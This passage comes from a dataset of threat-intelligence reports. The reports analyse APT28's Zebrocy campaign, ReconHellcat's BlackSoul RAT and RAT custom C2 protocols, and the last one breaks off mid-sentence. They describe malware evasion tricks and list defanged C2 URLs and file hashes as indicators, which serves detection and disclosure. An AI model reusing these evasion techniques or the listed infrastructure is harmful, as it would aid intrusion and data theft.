LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. NameSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato.txt,quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato,G0010,"APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure Sep 22, 2020 **Executive Summary** --------------------- * On 9 August, [QuoIntelligence](https://quointelligence.eu/) detected an ongoing APT28 campaign, which likely started on 5 August. * The malware used in the attack was the Zebrocy Delphi version. All the artifacts had very low Anti-Virus (AV) detection rates on VirusTotal when they were first submitted. * At the time of the discovery, the C2 infrastructure hosted in France was still live. * The campaign used NATO’s upcoming trainings as a lure. * The campaign targeted a specific government body in Azerbaijan, however; it is likely that attackers also targeted NATO members or other countries involved in NATO exercises. * Analysis revealed interesting correlations with ReconHell/BlackWater attack, which we [uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August. * As part of our responsible disclosure, we reported our findings to French authorities for taking down the C2, and to NATO for their awareness. **Introduction** ---------------- On 9 August, QuoIntelligence disseminated a Warning to its government customers about a new APT28 (*aka* Sofacy, Sednit, Fancy Bear, STRONTIUM, etc. campaign targeting government bodies of [NATO](https://www.nato.int/) members (or countries cooperating with NATO). In particular, we found a malicious file uploaded to VirusTotal, which ultimately drops a Zebrocy malware and communicates with a C2 in France. After our discovery, we reported the malicious C2 to the French law enforcement as part of our responsible disclosure process. Zebrocy is a malware used by APT28 (also known as Sofacy), which was reported by multiple security firms[[1]](#_ftn1)[[2]](#_ftn2)[[3]](#_ftn3)[[4]](#_ftn4)[[5]](#_ftn5)[[6]](#_ftn6) in the last two years. Finally, our investigation concluded that the attack started on 5 August and targeted at least a government entity located in the Middle East. However, it is highly likely that NATO members also observed the same attack. Technical Analysis ------------------ | **File Name** | Course 5 – 16 October 2020.zipx | | **SHA256** | e6e19633ba4572b49b47525b5a873132dfeb432f075fbba29831f1bc59d5885d | | **First Submission to VT** | 2020-08-05T12:28:27 | | **First AV detetction rate** | Really Low (3/61) | At a first look, the sample seems to be a valid JPEG image file: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""file_type"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet1.png ""file_type"") In fact, if the file is renamed as a JPG, the Operating System will show the logo of the Supreme Headquarters Allied Powers Europe ([SHAPE](https://shape.nato.int/)), which is the NATO’s Allied Command Operations (ACO) located in Belgium. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""courses_zipx"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/courses_zipx.png ""courses_zipx"") However, further analysis revealed the sample as having a Zip file concatenated. This technique works because JPEG files are parsed from the beginning of the file and some Zip implementations parse Zip files from the end of the file (since the index is located there) without looking at the signature in the front. The technique is also used by threat actors to evade AVs, or other filtering systems since they might mistake the file for a JPEG and skip it. Interestingly, in order to trigger the decompression of the file on Windows after the user clicks on it, the following conditions need to be met: a) the file must be correctly named .zip(x); b) the file needs to be opened with WinRAR. The file will show an error message claiming it is corrupted if the targeted victim uses WinZip or the default Windows utility. After decompressing the appended ZIP file, the following two samples are dropped: * Course 5 – 16 October 2020.exe (Zebrocy malware) SHA256: aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec * Course 5 – 16 October 2020.xls (Corrupted file) SHA256: b45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185 Considering the lure uses a NATO image, the attackers likely picked the filenames in order to leverage upcoming [NATO courses](https://www.natoschool.nato.int/Academics/Portfolio/Course-Catalogue#2aid-aid) in October 2020. Additionally, the Excel file (XLS) is corrupted and cannot be opened by Microsoft Excel, it contains – what seems to be – information about military personnel involved in the military mission “African Union Mission for Somalia”. The long list of information includes names, ranks, unit, arrival/leave dates, and more. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""African_Union_Mission_for_Somalia"")![](https://quointelligence.eu/wp-content/uploads/2020/09/African_Union_Mission_for_Somalia.png ""African_Union_Mission_for_Somalia"") To note, QuoIntelligence was not able to determine if the information contained in the file is legitimate or not. One of the hypotheses explaining the corrupted file is an intentional tactic of the attacker. The rationale could be that the attacker makes the user attempt to first open the XLS file, and then open the .exe with the same filename as a second try. The .exe file has a PDF icon, so if file extensions are not shown, targeted users might be lured into opening the executable. | **File Name** | Course 5 – 16 October 2020.exe | | **SHA256** | aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec | | **First Submission to VT** | 2020-08-05T18:33:39 | | **First AV detection rate** | Really Low (9/70) | The sample analyzed is a Delphi executable. Since 2015, [multiple](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) have already covered Zebrocy Delphi versions in-depth. Interestingly, last Zebrocy [observations](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) seemed to suggest a discontinuity of the Delphi versions in favor of a new one written in [Go language](https://securelist.com/a-zebrocy-go-downloader/89419/). Behavior Analysis ----------------- Once executed, the sample copies itself into %AppData%\Roaming\Service\12345678\sqlservice.exe by adding 160 random bytes to the new file. This padding is used to evade hash-matching security controls, since the dropped malware will always have a different file hash value. Next, the malware creates a new scheduled task, and it is executed with the /s parameter ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""code_snippet1"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet2.png ""code_snippet1"") The task runs regularly and tries to POST stolen data (e.g. screenshots) to hxxp://194.32.78[.]245/protect/get-upd-id[.]php ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""network_traffic_POST_1"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet3.png ""network_traffic_POST_1"") At a first glance, the data seems to be obfuscated and encrypted. Another request looks like this: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""network_traffic_POST_2"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet4.png ""network_traffic_POST_2"") The heading number 12345678 (the original eight digits were redacted) seems to be constant, suggesting its use as a unique ID of the infected machine. Notably, the same number is also used by the malware while creating the folder that contains sqlservice.exe Letting the sample talk to its actual C2 on the Internet did not change its actual behavior during our analysis. The malware sends POST requests about once per minute without getting a response back. Additionally, the server closes the connection after waiting for about 10 more seconds. It is possible that this unresponsive behavior is due to the C2 determining the infected machine as not interesting. Lastly, the network traffic generated to the C2 triggers the following Emerging Threats (ET) IDS rule: * ET TROJAN Zebrocy Screenshot Upload” (SID: 2030122) Victimology and Attribution --------------------------- QuoIntelligence concludes with medium-high confidence that the campaign targeted a specific government body, *at* *least* in Azerbaijan. Although Azerbaijan is not a NATO member, it closely cooperates with the North-Atlantic organizations and participates in NATO exercises. Further, the same campaign very likely targeted other NATO members or countries cooperating with NATO exercises. By analyzing the Tactics, Techniques and Procedures (TTPs), the targeting, and the theme used as a lure, we have high confidence in attributing this attack to the well-known APT28/Zebrocy TTPs disclosed by the security community in the last year. An Interesting Coincidence. --------------------------- Although we could not find any strong causation link yet or solid technical link between the two attacks, it should be noted the following points correlating with the ReconHellcat campaign [we uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) on August 11: * Both the compressed Zebrocy malware and the OSCE-themed lure used to drop the BlackWater backdoor were uploaded the same day, on 5 August. * Both samples were uploaded by the same user in Azerbaijan and are highly likely by the same organization. * Both attacks happened in the same timeframe. * OSCE and NATO are both organizations that have been targeted (directly or indirectly) by APT28 in the past. * The victimology we identified for the ReconHellcat campaign is in line with the one targeted by the Zebrocy attack (i.e. similar type of government bodies). The type of organizations targeted by both attacks is also in line with known APT28 victimology. * We assessed ReconHellcat as a high-capability APT group, like APT28. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""VT_times"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/VT_times.png ""VT_times"") Citations --------- [[1]](#_ftnref1) ESET, A1, April 2018, [Sednit update: Analysis of Zebrocy](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [[2]](#_ftnref2) Palo Alto, B1, June 2018, [Sofacy Group’s Parallel Attacks](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) [[3]](#_ftnref3) Kaspersky, A1, October 2018, [Shedding Skin – Turla’s Fresh Faces](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/) [[4]](#_ftnref4) Kaspersky, A1, Janurary 2019, [A Zebrocy Go Downloader](https://securelist.com/a-zebrocy-go-downloader/89419/) [[5]](#_ftnref5) Kaspersky, A1, January 2019, [GreyEnergy’s overlap with Zebrocy](https://securelist.com/greyenergys-overlap-with-zebrocy/89506/) [[6]](#_ftnref6) Kaspersky, A1, June 2019, [Zebrocy’s Multilanguage Malware](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) Appendix I – IOCs ----------------- hxxp://194.32.78.245/protect/get-upd-id.php **Course 5 – 16 October 2020.zipx** 6e89e098816f3d353b155ab0f3377fe3eb3951f45f8c34c4a48c5b61cd8425aa **Course 5 – 16 October 2020.xls (Corrupted file)** b45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185 **Course 5 – 16 October 2020.exe (Zebrocy malware)** aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec **Additional Zebrocy malware variants on VT** fae335a465bb9faac24c58304a199f3bf9bb1b0bd07b05b18e2be6b9e90d72e6 eb81c1be62f23ac7700c70d866e84f5bc354f88e6f7d84fd65374f84e252e76b MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Execution** | [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | | **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/) | | **Discovery** | [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) [T1135: Network Share Discovery](https://attack.mitre.org/techniques/T1135/) [T1120: Peripheral Device Discovery](https://attack.mitre.org/techniques/T1120/) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057/) [T1012: Query Registry](https://attack.mitre.org/techniques/T1012/) [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082/) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/) [T1049: System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/) [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124/) | | **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560/) [T1119: Automated Collection](https://attack.mitre.org/techniques/T1119/) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113/) | | **Command and Control** | [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | | **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) | Do you want to stay informed of cyber and geopolitical threats targeting *your* organization. Are you interested in receiving exclusive and unpublished intelligence. [Get in touch!](https://quointelligence.eu/talk-to-an-expert/) * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. NameSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as.txt,quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as,G0007,"ReconHellcat Uses NIST Theme as Lure To Deliver New BlackSoul Malware Jan 6, 2021 **Introduction** ---------------- On 27 November, QuoIntelligence detected a new malware, seemingly uploaded to VirusTotal by a user in Turkmenistan, which shares multiple similarities to the threat actor we previously dubbed ReconHellcat. The campaign ultimately delivers a **previously undocumented remote access Trojan (RAT), which we dubbed *BlackSoul*.** After promptly alerting our customers, we notified Cloudflare about the C2 infrastructure hosted on their [Workers service](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjk96Lux4buAhXUGFkFHeTyDCQQFjAAegQIARAC&url=https%3A%2F%2Fworkers.cloudflare.com%2F&usg=AOvVaw2Zt-uFSsvY_asdQQ5FHkKr) as per our responsible disclosure process. Further analysis revealed the malware being part of a targeted campaign, that likely originated with a spear phishing email delivering a [CAB](https://www.virustotal.com/gui/file/690872b8d0205203029b2b388b27f15a7673e9c02dab99f76216efc4a305cd4c/detection) archive. Both the CAB and the file contained within are named 1-10-20-hb44\_final to impersonate one of the documents available on the [National Institute of Standards and Technology (NIST)](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjzuM7Vy4buAhUjGFkFHS83CiAQFjAAegQIARAD&url=https%3A%2F%2Fwww.nist.gov%2F&usg=AOvVaw0908J5PhTOUQuVLJt9JE9z) website. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""archive_contents"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/archive_contents.png ""archive_contents"") *Figure 1: CAB archive contents* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""NIST_document"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/NIST_document.png ""NIST_document"") *Figure 2: Legitimate NIST document URL and filename* Technical Analysis ------------------ Loader.ReconHellcat ------------------- | **File Name** | 1-10-20-hb44\_final.exe | | **SHA256** | 3be1dd49f01e8b7ddf9af765693690d44356399b9e6043e51d5e13c82194b2a4 | | **First Submission to VT** | 2020-11-27 10:41:21 | | **First AV detection rate** | Low (10/71) | During our analysis, we determined 1-10-20-hb44\_final.exe is a malicious loader, which uses obfuscation similar to the variant observed in the previously [reported](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) ReconHellcat campaign delivering BlackWater malware. Another similarity is that the loader utilizes C2 infrastructure hosted on the Cloudflare Workers service. Following a successful C2 connection, the loader retrieves two files: (1) an executable named *blacksoul*, and (2) a Dynamic-Link Library (DLL) named *blacksoulLib*. Additionally, the loader opens Microsoft Word with the aforementioned legitimate document from the NIST website. Essentially, ReconHellcat uses this legitimate document as a decoy. The blacksoul and blacksoulLib files have compilation timestamps from 27 and 26 November, respectively. BlackSoul --------- | **File Name** | Bl4ck\_S0ul6s5\_1d7704b469.blacksoul | | **SHA256** | c49cad471a61adb5ea8a6d260887d1dd7f22de75d1143ce2a72828842ef4bb52 | | **First Submission to VT** | 2020-11-29 18:23:26 | | **First AV detection rate** | Low (18/71) | The second stage executable is a newly observed malware family, which we linked to the ReconHellcat threat actor. We named the malware “BlackSoul” to match its internal name, main class name, and file name. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""class_name_BlackSoul"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/class_name_BlackSoul.png ""class_name_BlackSoul"") *Figure 3: Class name “BlackSoul”* The malware is a classical minimal RAT, which is capable of file transfers and running arbitrary commands. Through static analysis, we determined that the executable’s main loop supports handling the following commands from its C2 server: | | Command Field Names | Actions Taken | | **1** | params | Executes a command and return the result. | | **2** | url and path or media and alternativeText | Downloads file(s) from a URL and stores them in a destination on the machine. Creates a destination folder if it does not already exist. | | **3** | paths | Likely retrieves a specified file from the machine and uploads it to the C2. | | **4** | config | Updates the configuration file (UsrClass.json) which contains C2 server info and miscellaneous fields. | *Table 1: BlackSoul Commands and Actions Taken* BlackSoul makes use of two files: * **UsrClass.json:** Contains a JSON configuration. It is unclear if this file is mandatory or merely used to save existing configurations between invocations of BlackSoul. * **UsrClass.data:** Observed as a DLL with an Init() export, which we refer to as blacksoulLib and will describe in depth in the next section. BlackSoul uses information gathered by blacksoulLib to call back to the C2 over the RESTful Strapi protocol and JSON based data encoding. The RAT’s string obfuscation applies only to strings in the main program but excludes strings of third-party compiled in libraries. BlackSoul additionally uses various other techniques for obfuscation. In particular, strings are constructed dynamically on the stack and deobfuscated with a variety of mechanisms, such as a fixed key XOR cipher and a Caesar cipher using variable shift values. blacksoulLib ------------ | **File Name** | Bl4ck\_S0ul6s5\_faac59ebe2.blacksoulLib | | **SHA256** | fdd310ce1b4f03a79f7a6eda8df793f4c0718766228a9a0700cf0b5a4ea648e2 | | **First Submission to VT** | 2020-11-26 23:45:57 | | **First AV detection rate** | Low (18/71) | ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""export_of_blacksoullib"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/export_of_blacksoullib.png ""export_of_blacksoullib"") *Figure 4: exports of the originally named blacksoulLib* The file is a DLL with a single export, Init(), which is called by BlackSoul. In this instance, its primary functions are: * Searching the victim’s machine for Firefox, Chrome, and Opera data. If the browser data is not found, the program terminates early. * Decoding a C2 URL later used by BlackSoul * Decoding a Cloudflare DNS-over-HTTPS (DoH) URL. * Generating further login information for the C2 and returning gathered data to BlackSoul in JSON format, including: + A username with three random appended characters. + A password consisting of 24 random characters. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""blacksoullib_C2_url_decrypt_and_setting_param"") ![](https://quointelligence.eu/wp-content/uploads/2021/01/blacksoullib_C2_url_decrypt_and_setting_param-.png ""blacksoullib_C2_url_decrypt_and_setting_param"") **Figure 5:** C2 URL decryption and setting of the URL parameter Based on our observations, the DLL’s specific functionality adapts to various victims’ environments, and the DLL outputs different C2 information for various targets. Victimology ----------- QuoIntelligence was unfortunately unable to uncover the entities targeted by this campaign. The only information at hand relies on: * The VirusTotal submitter’s country (Turkmenistan) * The theme used as a lure (NIST) Due to the limited information available to determine victimology, we cannot definitively state a target. However, it is likely that the BlackSoul campaign targeted a government-related body based on the theme lure, since NIST develops and publicizes security compliance standard for the US Federal Government and any organization who handles government data. As well, previously observed ReconHellcat campaign targets consisted of primarily defense and diplomatic government bodies. Attribution ----------- When we initially discovered ReconHellcat, its campaign characteristics and Tactics, Techniques, and Procedures (TTPs) were unique enough to classify it as a new threat actor. During our analysis of the new BlackSoul campaign, we identified limited yet sufficient similarities overlapping with the earlier observed BlackWater campaign. As a result, we have high confidence attributing this attack to ReconHellcat. Similarities to earlier ReconHellcat campaigns: ----------------------------------------------- * Lure themes of government related organization materials. * Usage of compressed archives, likely via spear phishing email links or attachments, to distribute the initial attack artifacts. * A three-stage attack scheme. Similarities between ReconHellcat‘s BlackSoul and BlackWater malware: * Supports DNS-over-HTTPS (DoH) using cloudflare-dns.com. * Has clear internal naming likely due to a lack of artifact cleanup in the malware build process. * Resolves the C2 hostnames via DNS over HTTPS (DoH) using a built-in feature of libcurl, aclient-side URL transfer library. * Contains paths and parameters to use Strapi – a content management system (CMS). * Identical string obfuscation. * Uses Cloudflare Workers Service (*.workers[.]dev) to host C2 infrastructure. * JSON–encoded communications. * Similar kind of randomized login (user registration) scheme with the C2 server. * Malware samples contain a ‘Black’ prefix in their naming schemes. To note, although we have not found a strong correlation or technical link between ReconHellcat and APT28, there are shared characteristics between the two groups, which we highlighted in our recent APT28 [reporting](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/). Appendix I – IOCs ----------------- hxxps://noisy-haze-af47.fromhell.workers.dev/uploads/Bl4ck\_S0ul6s5\_1d7704b469.blacksoul hxxps://noisy-haze-af47.fromhell.workers.dev/uploads/Bl4ck\_S0ul6s5\_faac59ebe2.blacksoulLib hxxps://shrill-wave-90be.0black.workers.dev/ **Loader.ReconHellcat** 3be1dd49f01e8b7ddf9af765693690d44356399b9e6043e51d5e13c82194b2a4 **BlackSoul** c49cad471a61adb5ea8a6d260887d1dd7f22de75d1143ce2a72828842ef4bb52 **blacksoulLib** fdd310ce1b4f03a79f7a6eda8df793f4c0718766228a9a0700cf0b5a4ea648e2 MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Initial Access** | [T1566: Phishing](https://attack.mitre.org/techniques/T1566/) | | **Execution** | [T1204: User Execution](https://attack.mitre.org/techniques/T1204/) | | **Defense Evasion** | [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) | | **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) | | **Discovery** | [T1082 System Information Discovery](https://attack.mitre.org/techniques/T1082/) | | **Collection** | [T1005: Data from Local System](https://attack.mitre.org/techniques/T1005/) | | **Command and Control** | [T1132: Data Encoding](https://attack.mitre.org/techniques/T1132/) [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) [T1572: Protocol Tunneling](https://attack.mitre.org/techniques/T1572/) | | **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) [T1020: Automated Exfiltration](https://attack.mitre.org/techniques/T1020/) | Do you want to stay informed of cyber and geopolitical threats targeting *your* organization. Are you interested in receiving exclusive and unpublished intelligence. [Get in touch!](https://quointelligence.eu/talk-to-an-expert/) * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. EmailSubscribe"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0026,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire 